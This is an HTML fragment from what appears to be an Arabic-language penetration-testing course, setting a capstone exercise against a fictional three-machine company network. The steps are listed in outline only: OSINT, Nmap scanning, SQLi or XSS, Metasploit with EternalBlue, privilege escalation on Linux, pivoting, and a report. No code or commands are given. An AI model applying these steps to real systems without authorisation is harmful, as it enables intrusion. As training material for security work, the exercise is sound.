        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع والعشرون: مشروع ختامي شامل</h2>
        <p><strong>سيناريو المشروع:</strong> أنت مختبر اختراق أخلاقي، وكُلفت باختبار شبكة شركة افتراضية تحتوي على 3 أجهزة (لينكس، ويندوز، خادم ويب).</p>
        <p><strong>المطلوب:</strong></p>
        <ol>
          <li>جمع معلومات (OSINT) عن الشركة.</li>
          <li>مسح الشبكة باستخدام Nmap (اكتشاف المنافذ المفتوحة والخدمات).</li>
          <li>استغلال ثغرات الويب (SQLi أو XSS) على خادم الويب.</li>
          <li>استخدام Metasploit لاختراق جهاز ويندوز (مثلاً باستخدام ثغرة EternalBlue).</li>
          <li>رفع الامتيازات على جهاز لينكس إلى الجذر (باستخدام SUID أو Kernel exploit).</li>
          <li>نقل الحركة (Pivoting) من جهاز مخترق إلى آخر داخل الشبكة الداخلية.</li>
          <li>كتابة تقرير كامل (5-10 صفحات) يوضح الخطوات والثغرات والتوصيات.</li>
        </ol>
        <p><strong>تقيم ذاتي:</strong> هل تستطيع تطبيق كل هذه الخطوات دون مساعدة؟ إذا كانت الإجابة نعم، فأنت مؤهل لدور Penetration Tester مبتدئ.</p>
      `
    },
  ],
};
